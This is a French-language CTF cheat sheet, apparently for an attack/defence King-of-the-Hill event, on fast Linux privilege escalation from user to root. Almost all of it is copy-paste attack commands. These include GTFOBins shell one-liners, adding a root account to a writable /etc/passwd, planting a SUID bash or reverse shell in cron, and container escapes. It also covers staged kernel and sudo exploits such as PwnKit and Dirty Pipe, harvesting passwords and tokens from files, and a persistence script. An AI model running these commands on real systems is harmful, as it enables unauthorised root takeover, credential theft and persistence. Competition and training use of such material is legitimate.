# Privesc Linux — quick wins (prise de box rapide, A&D/KoTH)

But : passer `user → root` le plus vite possible sur une box in-scope, puis enchaîner
`onbox_persist.sh`. Ordre = du plus rapide/fréquent au plus rare. Copier-coller.
**In-scope uniquement, pas de DoS.** (Auto : `linpeas.sh` si droppable — mais tester les
quick wins manuels d'abord, c'est souvent plus rapide qu'attendre linpeas.)

## Arsenal pré-staged (hors-ligne, 2026-11-15) — `src/tools/ctf/koth_finale/privesc-arsenal/`
Copier sur la cible (scp/upload), `chmod +x`, puis **lancer l'auto-privesc EN PREMIER** :
```bash
./bin/traitor-amd64 -a      # auto : sudo/SUID/caps/docker/CVE → root si vecteur connu
sh linpeas.sh | tee lp.txt  # si traitor échoue : énum complète
./bin/pspy64                # voir cron/process sans root (recon A&D)
```
Exploits prêts (sans compiler sur la cible) : `pwnkit/PwnKit` (CVE-2021-4034, autonome),
`dirtypipe/dirtypipez /usr/bin/su` (CVE-2022-0847), `baron-samedit/exploit_nss.py` (CVE-2021-3156),
sources `looney-tunables/` (CVE-2023-4911), `nftables-1086/` (CVE-2024-1086). Détail + commandes :
`privesc-arsenal/MANIFEST.md`. **In-scope uniquement.**

## 0. Collecte express (5 s)
```bash
id; sudo -n -l 2>/dev/null; uname -a; cat /etc/os-release 2>/dev/null | head -2
```

## 1. sudo (le + fréquent)
```bash
sudo -n -l 2>/dev/null         # droits sans mot de passe
```
- `(ALL) NOPASSWD: ALL` → `sudo -n su -` ou `sudo -n bash`.
- Un binaire précis en NOPASSWD → **GTFOBins** (réflexe) : `sudo -n <bin>` + la ligne GTFOBins.
  Classiques : `env` (`sudo -n /usr/bin/env /bin/sh` ← vu au préqual Citadel), `vim`/`nano`,
  `find` (`sudo find . -exec /bin/sh \; -quit`), `python`/`perl`/`ruby`, `tar`/`zip`, `awk`, `less`, `man`, `tee`.
- `env_keep+=LD_PRELOAD` / `LD_LIBRARY_PATH` dans `sudo -l` → LD_PRELOAD vers une .so qui setuid(0).

## 2. SUID / SGID
```bash
find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null
```
→ tout binaire hors liste standard → **GTFOBins (section SUID)**. Fréquents : `find`, `bash`,
`cp`, `nmap --interactive` (vieux), `python`, `env`, `vim`. Ex. `cp` SUID → écraser `/etc/passwd`.

## 3. Capabilities
```bash
getcap -r / 2>/dev/null
```
- `cap_setuid+ep` sur python → `python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'`
- `cap_setuid` sur perl/node/ruby → idem via l'API du langage.

## 4. Fichiers/jobs modifiables (write = root)
```bash
# /etc/passwd inscriptible -> ajouter un root
ls -l /etc/passwd; openssl passwd -1 -salt x pass   # -> coller 'r00t:$1$x$..:0:0::/root:/bin/bash'
# sudoers / cron / scripts root inscriptibles
ls -la /etc/sudoers.d/ /etc/cron.d/ /etc/cron.*/ 2>/dev/null
find / -writable -type f 2>/dev/null | grep -E "cron|systemd|/etc/|\.sh$" | head
# PATH hijack si un script/SUID root appelle un binaire sans chemin absolu
```
- Unité systemd / service inscriptible (`ExecStart=`) → mettre notre payload + `systemctl restart`.
- `/etc/cron.d/*` ou un script appelé par cron, inscriptible → y planter `chmod +s /bin/bash` ou un reverse.

## 5. Kernel / CVE one-shot (si rien au-dessus) — vérifier `uname -r`
- **PwnKit** `CVE-2021-4034` (pkexec, quasi universel ≤2022) : `command -v pkexec` puis exploit PwnKit.
- **Baron Samedit** `CVE-2021-3156` (sudo < 1.9.5p2) : `sudo --version`.
- **Dirty Pipe** `CVE-2022-0847` (kernel 5.8–5.16.11).
- **DirtyCow** `CVE-2016-5195` (vieux kernels).
- **nf_tables / `CVE-2024-1086`**, `looney tunables CVE-2023-4911` (glibc) sur systèmes récents.
  (Pré-stager les binaires compilés hors-ligne ; ne pas compiler sur la cible si possible.)

## 6. Conteneur ? (souvent le cas en A&D/KoTH) — s'échapper vers l'hôte
```bash
id | grep -q docker && echo "groupe docker -> root hôte"      # docker run -v /:/mnt ... 
ls -la /var/run/docker.sock 2>/dev/null                        # socket accessible -> root hôte
cat /proc/1/mountinfo 2>/dev/null | grep -i "/host\|bind"      # bind mount hôte mal scopé (lire/écrire hôte)
capsh --print 2>/dev/null | grep -i cap_sys_admin              # cap_sys_admin -> release_agent / cgroup escape
grep -q unconfined /proc/self/attr/current 2>/dev/null && echo "AppArmor unconfined"  # (cf. lxc.apparmor.profile=unconfined)
```

## 7. Creds qui traînent
```bash
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
grep -rniE "password|passwd|secret|token|api[_-]?key" /home /var/www /opt /etc 2>/dev/null | head
ls -la ~/.ssh /home/*/.ssh 2>/dev/null; cat /opt/*/.env /var/www/**/.env 2>/dev/null
# réutilisation : tenter su/ssh avec un mdp trouvé ; DB locale (mysql -uroot -p<trouvé>)
```
- NFS `no_root_squash` (`cat /etc/exports`) → monter, déposer un SUID root.

## → Dès que root
```bash
KOTH_TOKEN=<notre_id> KING_FILE=/koth/king KING_FILE2=/king/king.txt \
  bash src/tools/ctf/koth_finale/onbox_persist.sh
```
puis purge des persistances adverses (cf. `onbox_persist.sh`) et on repart sur Défense + challenges.

Réf. conteneur : [[container-bindmount-setuid-escape]] ; KoTH : [[koth-hold-the-hill-continuous-and-onbox-persistence]].
